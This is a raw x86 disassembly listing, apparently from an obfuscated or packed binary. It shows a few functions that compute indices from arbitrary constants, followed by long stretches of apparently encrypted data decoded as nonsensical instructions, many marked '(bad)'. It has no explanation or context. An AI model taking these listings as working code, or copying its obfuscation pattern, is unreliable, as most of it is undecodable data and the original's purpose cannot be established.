  411018:	lock or ebx,DWORD PTR gs:[eax-0x7c8240ca]
  411020:	(bad)  
  411022:	jae    0x4110a0
  411024:	and    al,0xdc
  411026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411027:	jl     0x411058
  411029:	push   ds
  41102a:	adc    eax,0x593041f4
  41102f:	push   edi
  411030:	fadd   st,st(6)
  411032:	dec    edx
  411033:	mov    ecx,DWORD PTR [ebp-0x4]
  411036:	xor    edx,edx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax+0x22]
  4111f1:	fs push ebp
  4111f3:	stos   BYTE PTR es:[edi],al
  4111f4:	out    dx,al
  4111f5:	jl     0x41120f
  4111f7:	sbb    BYTE PTR [ecx+0x14],dh
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	cdq    
  4111fd:	jmp    DWORD PTR cs:[edi]
  411200:	mov    dh,0x11
  411202:	mov    BYTE PTR [edi-0x53a5a73c],al
  411208:	rcr    DWORD PTR [eax-0x4f],cl
  41120b:	rol    BYTE PTR [eax+0x294da792],cl
  411211:	ins    DWORD PTR es:[edi],dx
  411212:	adc    eax,0x234784cb
  411217:	ins    DWORD PTR es:[edi],dx
  411218:	loopne 0x41125c
  41121a:	and    esi,0x83a9c3c1
  411220:	cmp    al,0xb8
  411222:	jmp    0x411240
  411224:	jg     0x411296
  411226:	pusha  
  411227:	pop    ds
  411228:	mov    ecx,0x9fdf2bf4
  41122d:	push   ebx
  41122e:	cmp    bh,BYTE PTR [edx]
  411230:	cmc    
  411231:	popf   
  411232:	int    0xe5
  411234:	mov    edx,0xba54993f
  411239:	xchg   ebp,eax
  41123a:	mov    eax,0xd141ede4
  41123f:	push   ebp
  411240:	add    eax,0x381434f0
  411245:	mov    esp,0x9345bc81
  41124a:	push   es
  41124b:	mov    eax,0x5866e9bb
  411250:	sub    DWORD PTR [eax-0x21],edx
  411253:	fmul   st(4),st
  411255:	xchg   ebp,eax
  411256:	ss dec edx
  411258:	icebp  
  411259:	pop    ecx
  41125a:	xchg   ecx,eax
  41125b:	iret   
  41125c:	cdq    
  41125d:	push   esi
  41125e:	mov    ecx,0x3d309814
  411263:	mov    ecx,0xf16d99da
  411268:	je     0x4112d6
  41126a:	rcl    dh,0xa
  41126d:	mov    ebp,0xabc29474
  411272:	fisub  WORD PTR [esp+eiz*4-0x3675a3ec]
  411279:	ins    DWORD PTR es:[edi],dx
  41127a:	es sti 
  41127c:	aam    0xc2
  41127e:	xor    dh,BYTE PTR [ecx]
  411280:	jmp    0x7c79b4d
  411285:	xor    al,0xc9
  411287:	imul   esi,DWORD PTR [eax+0x5],0xffffffc6
  41128b:	mov    eax,0x659fbcba
  411290:	sub    ah,BYTE PTR [eax]
  411292:	add    ecx,eax
  411294:	mov    esp,ebx
  411296:	pop    ecx
  411297:	inc    edx
  411298:	iret   
  411299:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41129a:	lahf   
  41129b:	adc    ebp,edx
  41129d:	xor    bl,BYTE PTR [edi+ebx*8+0x9384f93]
  4112a4:	into   
  4112a5:	aas    
  4112a6:	sbb    bh,BYTE PTR [ecx-0x21acaa43]
  4112ac:	and    ecx,ecx
  4112ae:	outs   dx,BYTE PTR ds:[esi]
  4112af:	dec    edi
  4112b0:	dec    BYTE PTR es:[ecx+eax*2]
  4112b4:	adc    eax,0x93fb2179
  4112b9:	xchg   DWORD PTR [edx-0x4336989b],ebx
  4112bf:	fldcw  WORD PTR [esi+0x33cdbad2]
  4112c5:	dec    ebx
  4112c6:	xchg   edi,eax
  4112c7:	or     edx,DWORD PTR [esi]
  4112c9:	sub    esi,DWORD PTR [ebx]
  4112cb:	fidivr DWORD PTR [edx+0x6bcb88a8]
  4112d1:	lahf   
  4112d2:	(bad)  
  4112d3:	add    eax,0xe041ec0b
  4112d8:	popf   
  4112d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112da:	(bad)  
  4112db:	popa   
  4112dc:	dec    edi
  4112dd:	scas   eax,DWORD PTR es:[edi]
  4112de:	jns    0x411297
  4112e0:	push   ds
  4112e1:	jae    0x4112d4
  4112e3:	or     al,0x1c
  4112e5:	jno    0x4112ed
  4112e7:	push   eax
  4112e8:	ins    BYTE PTR es:[edi],dx
  4112e9:	inc    edx
  4112ea:	xchg   DWORD PTR [edi],ebp
  4112ec:	mov    al,bl
  4112ee:	dec    eax
  4112ef:	ffreep st(4)
  4112f1:	lahf   
  4112f2:	outs   dx,DWORD PTR ds:[esi]
  4112f3:	xor    BYTE PTR [ebx-0x56],dh
  4112f6:	loope  0x41133a
  4112f8:	(bad)
  4112fb:	stos   DWORD PTR es:[edi],eax
  4112fc:	and    al,0x8f
  4112fe:	cmp    al,0x41
  411300:	mov    ebx,0x6436b6e6
  411305:	mov    dh,0x2a
  411307:	shl    BYTE PTR [ebx],cl
  411309:	adc    DWORD PTR ds:0xe5c7bdb4,0x64662227
  411313:	in     al,dx
  411314:	sbb    edi,DWORD PTR [edi+0x4]
  411317:	mov    dl,0x6d
  411319:	or     DWORD PTR [esp+ebx*4-0x11e61e6f],0xfffffffa
  411321:	cmp    ebx,DWORD PTR [ecx-0x253d7651]
  411327:	dec    eax
  411328:	mov    eax,0xd2d42f4b
  41132d:	aam    0xa9
  41132f:	add    cl,al
  411331:	and    BYTE PTR [ecx+0x1766b998],0xe3
  411338:	cmp    bl,BYTE PTR [edx-0x19643557]
  41133e:	xor    al,0xd8
  411340:	mov    cl,0x93
  411342:	mov    bh,dh
  411344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411345:	ret    0xd6a6
  411348:	adc    ebx,ebp
  41134a:	adc    esp,DWORD PTR [edi+ebp*1+0x344f41dd]
  411351:	pop    edi
  411352:	mov    ch,0xfb
  411354:	mov    cl,0x72
  411356:	test   BYTE PTR [ebx+0x5709a948],bl
  41135c:	std    
  41135d:	das    
  41135e:	inc    ecx
  41135f:	mov    gs:0xe2c57b41,eax
  411365:	mov    bl,0x15
  411367:	pop    ds
  411368:	adc    al,0xa
  41136a:	cld    
  41136b:	mov    al,0xca
  41136d:	sbb    esp,DWORD PTR [ecx+0x54b55437]
  411373:	std    
  411374:	mov    esi,DWORD PTR [edx-0x66]
  411377:	lods   al,BYTE PTR ds:[esi]
  411378:	or     edx,ecx
  41137a:	jp     0x411323
  41137c:	xor    al,0xc9
  41137e:	pop    ss
  41137f:	xchg   BYTE PTR [ecx+0x7f],bl
  411382:	xchg   ebx,eax
  411383:	push   ds
  411384:	call   0x650e:0xc2697730
  41138b:	sbb    BYTE PTR [edi+0x1975d603],ah
  411391:	pop    ebp
  411392:	xchg   edi,eax
  411393:	into   
  411394:	sub    edx,DWORD PTR [edx+ebp*1]
  411397:	jmp    0x2abd188b
  41139c:	adc    al,0x7c
  41139e:	xchg   edx,eax
  41139f:	mov    cl,0xdf
  4113a1:	jge    0x4113e0
  4113a3:	aaa    
  4113a4:	pop    edx
  4113a5:	pop    ds
  4113a6:	in     eax,dx
  4113a7:	(bad)  
  4113a8:	sbb    eax,0x8a6539b
  4113ad:	sub    bh,ah
  4113af:	push   0xfcae6c5c
  4113b4:	scas   eax,DWORD PTR es:[edi]
  4113b5:	in     eax,dx
  4113b6:	adc    al,0xb2
  4113b8:	fdiv   st(7),st
  4113ba:	in     eax,0x79
  4113bc:	shr    BYTE PTR [ecx+0x141a0a5a],cl
  4113c2:	sub    edi,DWORD PTR [ebx+0x74d9dbf2]
  4113c8:	pop    ebp
  4113c9:	mov    dl,0x98
  4113cb:	sub    al,0x64
  4113cd:	dec    ebp
  4113ce:	out    dx,al
  4113cf:	jle    0x4113bc
  4113d1:	mov    cl,0xb8
  4113d3:	stc    
  4113d4:	mov    edi,0x918092a2
  4113d9:	inc    ebp
  4113da:	je     0x4113e0
  4113dc:	jnp    0x411361
  4113de:	sub    edx,DWORD PTR [ecx-0xdb0dc6b]
  4113e4:	outs   dx,BYTE PTR ds:[esi]
  4113e5:	pusha  
  4113e6:	cld    
  4113e7:	inc    esi
  4113e8:	je     0x4113b5
  4113ea:	retf   
  4113eb:	mov    ch,0x86
  4113ed:	lock xchg dl,ah
  4113f0:	ja     0x4113d7
  4113f2:	test   ax,0xccd1
  4113f6:	jmp    0x41143d
  4113f8:	sbb    al,0xa1
  4113fa:	ins    BYTE PTR es:[edi],dx
  4113fb:	or     DWORD PTR [ebx],0x5c
  4113fe:	in     al,0xbb
  411400:	cmc    
  411401:	xchg   ebp,eax
  411402:	lahf   
  411403:	call   0xf334:0x66abd97d
  41140a:	and    eax,0xee8b7f87
  41140f:	(bad)  
  411410:	cs inc ebp
  411412:	imul   BYTE PTR [edi-0x453d35bf]
  411418:	les    edi,FWORD PTR gs:[ebp+ebp*8-0x3f7890b9]
  411420:	pop    edx
  411421:	into   
  411422:	rol    BYTE PTR [edi-0x4b],0xf9
  411426:	inc    esi
  411427:	mov    ds,ebp
  411429:	sbb    esi,DWORD PTR ds:0xdfbfa061
  41142f:	mov    ?,edi
  411431:	push   ebx
  411432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411433:	cmovnp ecx,DWORD PTR [esi+0x6a8aa958]
  41143a:	jmp    0x4113f2
  41143c:	dec    esp
  41143d:	cmp    DWORD PTR [ebp+0xde9fd80],eax
  411443:	je     0x411458
  411445:	rcr    bh,1
  411447:	retf   
  411448:	loopne 0x411443
  41144a:	pop    edx
  41144b:	dec    eax
  41144c:	jmp    0x1f6c:0x813abb40
  411453:	jb     0x41141c
  411455:	test   DWORD PTR [eax-0x1],edx
  411458:	(bad)  
  411459:	jmp    DWORD PTR [ebp+esi*2+0x0]
  41145d:	add    bh,al
  41145f:	test   DWORD PTR [edi+edi*8-0x1],edx
  411463:	dec    edi
  411465:	sbb    BYTE PTR [eax],al
  411467:	add    bh,al
  411469:	test   DWORD PTR [eax-0x1],esp
  41146c:	(bad)  
  41146d:	push   DWORD PTR ds:0xc7000031
  411473:	test   DWORD PTR [edi+edi*8-0x1],esp
  411477:	dec    DWORD PTR [ebp-0x38ffffaa]
  41147d:	test   DWORD PTR [eax-0x1],esi
  411480:	(bad)  
  411481:	push   edx
  411483:	adc    DWORD PTR [eax],eax
  411485:	add    bh,al
  411487:	test   DWORD PTR [edi+edi*8-0x1],esi
  41148b:	(bad)  
  41148c:	jmp    0xf045:0xc7000063
  411493:	data16 xor BYTE PTR [eax],al
  411496:	add    bh,al
  411498:	inc    ebp
  411499:	clc    
  41149a:	shr    BYTE PTR [esi+0x0],cl
  41149d:	add    BYTE PTR [eax+0x1d],ch
  4114a0:	jle    0x4114a2
  4114a2:	add    cl,ch
  4114a4:	jo     0x4114a8
  4114a6:	add    BYTE PTR [eax],al
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax-0x4281de78]
  4114b5:	adc    bl,BYTE PTR [ecx-0x56]
  4114b8:	inc    edi
  4114b9:	js     0x4114d3
  4114bb:	sbb    BYTE PTR [ecx+0x14],dh
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	lock cmc 
  4114c2:	or     eax,0xf2103e27
  4114c7:	inc    ebx
  4114c8:	jbe    0x41149d
  4114ca:	push   ebp
  4114cb:	mov    ah,BYTE PTR [ecx]
  4114cd:	mov    bl,0x33
  4114cf:	fldenv [esi]
  4114d1:	sub    cl,BYTE PTR [eax+esi*4-0x63699ddc]
  4114d8:	mov    edi,0x8f02c32
  4114dd:	add    DWORD PTR [esi-0x5c29c718],esi
  4114e3:	mov    esp,0x1758cba7
  4114e8:	out    dx,al
  4114e9:	xchg   ebp,eax
  4114ea:	aaa    
  4114eb:	int    0xeb
  4114ed:	int3   
  4114ee:	mov    ds:0x1d55734,eax
  4114f3:	jmp    0x411547
  4114f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114f6:	or     DWORD PTR [esi-0x49],esi
  4114f9:	inc    eax
  4114fa:	mov    edi,0xe4095130
  4114ff:	xor    ebx,edi
  411501:	test   al,0x7
  411503:	xchg   edi,eax
  411504:	call   DWORD PTR [edi+ecx*8+0x23]
  411508:	sahf   
  411509:	add    BYTE PTR [esi],0xa9
  41150c:	out    dx,al
  41150d:	fild   WORD PTR [ebp-0x457663c6]
  411513:	xchg   ecx,eax
  411514:	jae    0x411526
  411516:	and    al,0x92
  411518:	arpl   sp,ax
  41151a:	ins    BYTE PTR es:[edi],dx
  41151b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41151c:	pop    ecx
  41151d:	imul   esp,DWORD PTR [ecx-0x21437ed1],0xc9b2ce86
  411527:	in     eax,0x69
  411529:	popa   
  41152a:	ss loopne 0x4114b3
  41152d:	cmp    al,0x87
  41152f:	sub    edi,DWORD PTR [ecx-0xbda7ca4]
  411535:	fsubrp st(1),st
  411537:	loope  0x411546
  411539:	retf   
  41153a:	in     al,0xfc
  41153c:	dec    edx
  41153d:	js     0x4114d9
  41153f:	fidivr WORD PTR [edi-0x52]
  411542:	add    DWORD PTR [ebx-0x76],0xffffffff
  411546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411547:	mov    al,ds:0xeb85b910
  41154c:	lahf   
  41154d:	add    al,BYTE PTR [esp+ebx*8+0xe]
  411551:	scas   eax,DWORD PTR es:[edi]
  411552:	test   ch,ch
  411554:	ins    BYTE PTR es:[edi],dx
  411555:	or     BYTE PTR [ecx-0x5587cb3f],bl
  41155b:	add    al,0x71
  41155d:	nop
  41155e:	ja     0x4115dc
  411560:	xor    al,dh
  411562:	push   esi
  411563:	sbb    BYTE PTR [ebx+0x40],ah
  411566:	push   edx
  411567:	xchg   edi,eax
  411568:	dec    eax
  411569:	adc    BYTE PTR [ecx-0x1bc44ff5],al
  41156f:	pop    edx
  411570:	mov    ebx,0x8376dfef
  411575:	and    ebx,DWORD PTR [edi-0x2]
  411578:	imul   BYTE PTR ds:0xb8528488
  41157e:	add    BYTE PTR [edx+0x30478262],0x59
  411585:	xchg   edx,eax
  411586:	ins    DWORD PTR es:[edi],dx
  411587:	mov    dl,0x7f
  411589:	jle    0x411511
  41158b:	stos   BYTE PTR es:[edi],al
  41158c:	out    0xdc,eax
  41158e:	inc    DWORD PTR [eax-0x35]
  411591:	not    BYTE PTR [esp+ebp*8+0x66faae6f]
  411598:	sub    al,dh
  41159a:	adc    al,0xe2
  41159c:	dec    ebx
  41159d:	jns    0x411531
  41159f:	sahf   
  4115a0:	inc    ebx
  4115a1:	pushf  
  4115a2:	pop    esp
  4115a3:	inc    edx
  4115a4:	daa    
  4115a5:	inc    esp
  4115a6:	loopne 0x4115b9
  4115a8:	ds cld 
  4115aa:	push   edi
  4115ab:	add    DWORD PTR [edx-0x1b3b0527],esi
  4115b1:	(bad)  
  4115b3:	push   ebx
  4115b4:	cs xchg ecx,eax
  4115b6:	and    eax,0x935d5c1
  4115bb:	into   
  4115bc:	inc    eax
  4115bd:	inc    ebx
  4115be:	leave  
  4115bf:	pop    ebx
  4115c0:	and    eax,0x81c9edc1
  4115c5:	lahf   
  4115c6:	cmp    ch,bh
  4115c8:	enter  0x69e2,0x26
  4115cc:	jl     0x41156d
  4115ce:	add    eax,0x3bc5fc6a
  4115d3:	aam    0xd0
  4115d5:	jl     0x411624
  4115d7:	mov    eax,0xb9b5d81c
  4115dc:	cs aas 
  4115de:	nop
  4115df:	bndldx (bad),[ecx+0x15]
  4115e3:	inc    eax
  4115e4:	cld    
  4115e5:	aad    0x3
  4115e7:	jecxz  0x41158c
  4115e9:	mov    bl,0x80
  4115eb:	aad    0x51
  4115ed:	dec    edi
  4115ee:	cld    
  4115ef:	div    DWORD PTR ds:0x8b6a13bd
  4115f5:	stc    
  4115f6:	mov    bh,0x4
  4115f8:	retf   0x7c7f
  4115fb:	sbb    BYTE PTR [ecx],dl
  4115fd:	add    BYTE PTR [ebp+edi*4+0xd],dl
  411601:	int    0x74
  411603:	js     0x411625
  411605:	loope  0x4115c8
  411607:	push   cs
  411608:	mov    ds:0x4d1e041e,al
  41160d:	aad    0x1e
  41160f:	dec    ecx
  411610:	sub    eax,0x21e8cc7a
  411615:	cli    
  411616:	sahf   
  411617:	je     0x4115c9
  411619:	fsub   st(7),st
  41161b:	ins    DWORD PTR es:[edi],dx
  41161c:	fnstcw WORD PTR [eax]
  41161e:	mov    DWORD PTR [edx+0x6051e21],esp
  411624:	dec    ebx
  411625:	into   
  411626:	test   BYTE PTR [esi+0x62],0xc8
  41162a:	and    BYTE PTR [ebp-0xbfcaabe],dh
  411630:	adc    al,0x93
  411632:	pop    ebp
  411633:	pusha  
  411634:	add    BYTE PTR [ebx],bh
  411636:	push   ecx
  411637:	imul   esi,DWORD PTR [edi+0x4d],0x2c
  41163b:	daa    
  41163c:	in     eax,0x47
  41163e:	xchg   ebx,eax
  41163f:	dec    ebx
  411640:	arpl   WORD PTR [edx],dx
  411642:	mov    cl,0x4a
  411644:	cdq    
  411645:	inc    ecx
  411646:	clc    
  411647:	sbb    eax,0xb45a223a
  41164c:	xchg   ebp,eax
  41164d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41164e:	add    DWORD PTR [esi+edi*8],edx
  411651:	outs   dx,BYTE PTR ds:[esi]
  411652:	mov    esi,0x7086d4f1
  411657:	inc    edx
  411658:	mov    ebp,0xd633b8d6
  41165d:	mov    ch,0x6c
  41165f:	dec    DWORD PTR [eax-0xc8c7e64]
  411665:	stos   DWORD PTR es:[edi],eax
  411666:	int3   
  411667:	jmp    0x4115fb
  411669:	adc    DWORD PTR [eax-0x4a],ebx
  41166c:	js     0x411643
  41166e:	scas   al,BYTE PTR es:[edi]
  41166f:	and    ah,BYTE PTR [ecx]
  411671:	mov    al,0x9e
  411673:	adc    BYTE PTR [ebx],0xc6
  411676:	jle    0x411600
  411678:	mov    al,ds:0x3d8460ed
  41167d:	retf   
  41167e:	test   BYTE PTR [esi-0x59],dh
  411681:	das    
  411682:	mov    edi,esi
  411684:	sub    eax,0xbf202034
  411689:	sub    BYTE PTR [eax],dl
  41168b:	cmp    eax,0x1e765f7b
  411690:	sub    ecx,DWORD PTR [esi-0x470347b2]
  411696:	test   BYTE PTR [esi+0x2c],al
  411699:	in     al,dx
  41169a:	inc    esi
  41169b:	and    ebp,DWORD PTR [ebp+0x54]
  41169e:	sbb    bh,BYTE PTR [ebp+0x61]
  4116a1:	xchg   ebx,eax
  4116a2:	mov    BYTE PTR [edi],dh
  4116a4:	mov    esi,0xd90fefe7
  4116a9:	mov    DWORD PTR [ebx],esp
  4116ab:	pop    ecx
  4116ac:	jne    0x411687
  4116ae:	sub    al,0x6
  4116b0:	(bad)  
  4116b1:	sub    eax,DWORD PTR [ebx]
  4116b3:	xchg   BYTE PTR [edx+ebp*2],dl
  4116b6:	or     edi,DWORD PTR [esp+ecx*2]
  4116b9:	or     al,0x65
  4116bb:	jmp    0x4116bb
  4116bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116be:	hlt    
  4116bf:	pop    ebp
  4116c0:	sub    ecx,DWORD PTR [ebx+0x60df41e0]
  4116c6:	or     edx,0x4b
  4116c9:	sub    eax,0x12342842
  4116ce:	xor    BYTE PTR [edx],0xf6
  4116d1:	push   ebx
  4116d2:	and    eax,0x5962deeb
  4116d7:	xchg   ebp,eax
  4116d8:	int3   
  4116d9:	test   DWORD PTR [eax+0x1f],esp
  4116dc:	ins    BYTE PTR es:[edi],dx
  4116dd:	pop    esp
  4116de:	and    bl,BYTE PTR [edx]
  4116e0:	movaps XMMWORD PTR [ebx],xmm3
  4116e3:	in     eax,0x5f
  4116e5:	test   DWORD PTR [ecx-0x731884e6],0x51013f58
  4116ef:	ins    DWORD PTR es:[edi],dx
  4116f0:	ins    DWORD PTR es:[edi],dx
  4116f1:	lods   al,BYTE PTR ds:[esi]
  4116f2:	or     al,0xcd
  4116f4:	fs loop 0x411705
  4116f7:	mov    edi,eax
  4116f9:	and    eax,DWORD PTR [edi]
  4116fb:	and    eax,0xe194daf
  411700:	push   ebx
  411701:	push   0x2a28e1fd
  411706:	xor    BYTE PTR [eax+0x127e2ce5],bl
  41170c:	mov    ebp,0x28094e89
  411711:	xlat   BYTE PTR ds:[ebx]
  411712:	pop    ecx
  411713:	test   BYTE PTR [ebx+0x61],cl
  411716:	es rol edi,0x45
  41171a:	cld    
  41171b:	hlt    
  41171c:	xor    BYTE PTR [eax],al
  41171e:	add    BYTE PTR [ebx+0x4d8be045],cl
  411724:	in     al,0x68
  411726:	adc    BYTE PTR [ebx+0x0],0x0
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0x1871aa57
  411755:	adc    al,0xaa
  411757:	sahf   
  411758:	je     0x411772
  41175a:	sbb    BYTE PTR [ecx+0x14],dh
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	and    dl,bl
  411761:	cld    
  411762:	sub    DWORD PTR [edx-0x6b3cec2e],edx
  411768:	popa   
  411769:	scas   eax,DWORD PTR es:[edi]
  41176a:	pop    ecx
  41176b:	dec    esp
  41176c:	dec    esp
  41176d:	adc    al,0x6d
  41176f:	ds pop edx
  411771:	sahf   
  411772:	(bad)
  411775:	xor    ebp,edx
  411777:	ret    0xe24
  41177a:	lea    esi,[edi-0x19]
  41177d:	loopne 0x4117a9
  41177f:	jp     0x411765
  411781:	stos   DWORD PTR es:[edi],eax
  411782:	jl     0x41175a
  411784:	leave  
  411785:	in     eax,0x7c
  411787:	ret    0x124f
  41178a:	pop    eax
  41178b:	jmp    0xbcf1:0x818c9a49
  411792:	arpl   WORD PTR [esi+0x5],cx
  411795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411796:	add    eax,0x256c3bf
  41179b:	cdq    
  41179c:	and    DWORD PTR [esi],eax
  41179e:	mov    ebx,0x3dfeaa1c
  4117a3:	pop    edx
  4117a4:	sbb    BYTE PTR [ebp-0x2086d8ba],ah
  4117aa:	aad    0x2a
  4117ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117ad:	repnz xchg edi,eax
  4117af:	pop    eax
  4117b0:	retf   
  4117b1:	in     al,dx
  4117b2:	or     esp,DWORD PTR [edx+0x4]
  4117b5:	outs   dx,DWORD PTR ds:[esi]
  4117b6:	jae    0x4117e6
  4117b8:	scas   al,BYTE PTR es:[edi]
  4117b9:	mov    ebx,0xc66dfc40
  4117be:	and    BYTE PTR [esi],bl
  4117c0:	jno    0x411809
  4117c2:	ins    BYTE PTR es:[edi],dx
  4117c3:	jo     0x411791
  4117c5:	inc    esp
  4117c6:	ret    0xd372
  4117c9:	add    al,0x39
  4117cb:	idiv   BYTE PTR [ecx]
  4117cd:	jecxz  0x41180e
  4117cf:	cmp    ecx,0x16d173cb
  4117d5:	aas    
  4117d6:	test   esp,0xcf949f0c
  4117dc:	inc    eax
  4117dd:	or     BYTE PTR [esi+esi*4+0x46],0xc
  4117e2:	or     al,0x8c
  4117e4:	sub    al,0x0
  4117e6:	fdivrp st(1),st
  4117e8:	jns    0x411796
  4117ea:	fldenv ds:0xc0fb0ae8
  4117f0:	scas   eax,DWORD PTR es:[edi]
  4117f1:	or     ah,ah
  4117f3:	or     DWORD PTR [ebp+0x35],edx
  4117f6:	(bad)  
  4117f7:	sub    al,0xa3
  4117f9:	mov    ebp,0xc128ea95
  4117fe:	sbb    al,0x45
  411801:	jle    0x411868
  411803:	push   0x7513c70e
  411808:	sbb    BYTE PTR [ebx],0x95
  41180b:	cmp    al,0x8e
  41180d:	and    ah,BYTE PTR [esp+esi*8]
  411810:	and    bl,dl
  411812:	(bad)  
  411813:	cli    
  411814:	xor    DWORD PTR [esi-0x13c13b19],eax
  41181a:	adc    esi,eax
  41181c:	shl    BYTE PTR [ebp+0x22d466df],0x2b
  411823:	sub    ebp,DWORD PTR [ecx+esi*4+0x2311b747]
  41182a:	xor    cl,BYTE PTR [eax-0x1621660a]
  411830:	cmp    BYTE PTR [ebp-0x33],bl
  411833:	fdiv   QWORD PTR [esi+0x123ffa64]
  411839:	or     ch,BYTE PTR ds:0xdef0036a
  41183f:	adc    DWORD PTR [ecx+0x29],edi
  411842:	inc    ebp
  411843:	inc    ebx
  411844:	pop    edx
  411845:	pop    edi
  411846:	(bad)  
  411847:	mov    bl,0x87
  411849:	xor    DWORD PTR [ebx+0x48db7016],ecx
  41184f:	add    dl,BYTE PTR [edi+0x7c]
  411852:	jp     0x4117ed
  411854:	pop    esp
  411855:	aad    0x30
  411857:	ds inc ebx
  411859:	add    eax,0x65d407ab
  41185e:	push   ebx
  41185f:	hlt    
  411860:	pop    eax
  411861:	adc    DWORD PTR [edx],esi
  411863:	cs loop 0x411882
  411866:	jg     0x411826
  411868:	sub    BYTE PTR [edx+0x7d],bl
  41186b:	mov    ebx,0x3b2d8e12
  411870:	das    
  411871:	ins    DWORD PTR es:[edi],dx
  411872:	out    dx,al
